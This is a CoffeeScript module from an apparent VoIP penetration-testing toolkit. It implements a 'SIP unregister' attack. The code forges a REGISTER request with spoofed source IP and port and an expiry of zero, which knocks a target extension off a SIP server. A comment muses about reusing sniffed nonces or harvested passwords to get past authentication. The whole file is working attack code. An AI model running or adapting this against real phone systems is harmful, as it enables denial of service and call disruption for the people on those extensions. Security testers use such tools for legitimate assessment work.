###

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

###


# ---------------------- Requires --------------------------------

{SipMessage} = require "../tools/sipMessage.coffee"
{AsteroidsConn} = require "../tools/asteroidsConn.coffee"
{Printer} = require "../tools/printer.coffee"
{Utils} = require "../tools/utils.coffee"


# ----------------------- Class ----------------------------------

# This class implements SIP ungerister attack vector.
exports.SipUnreg =
class SipUnreg

	@run : (target, port, path, srcHost, transport, extension, cseq, callId) ->
		# Spoofed IP and port (at SIP layer).
		laddress = srcHost or Utils.randomIP()
		lport = Utils.randomPort()
		fromExt = extension
		toExt = extension

		msgObj = new SipMessage "REGISTER", "", target, port, laddress, lport, fromExt, toExt, transport, "", "", "", false, cseq, callId, "", "0", "", ""
		msgSend = (String) msgObj.create()
		
		conn = new AsteroidsConn target, port, path, transport, lport
		
		conn.on "newMessage", (stream) =>
		# TODO: Add support for authentication, we could have sniffed the nonce and the response
		# Its strange that the server reuse the nonces but we also could know the password of another
		# step of the pentesting. So It could be usefull to pass it instead the response directly, in
		# this case It would work even if the server change the nonce between requests.

		conn.on "error", (error) =>
			Printer.error
		
		# A request is sent.	
		conn.send msgSend
		Printer.highlight "\nSent request:\n"
		Printer.normal "#{msgSend}\n"
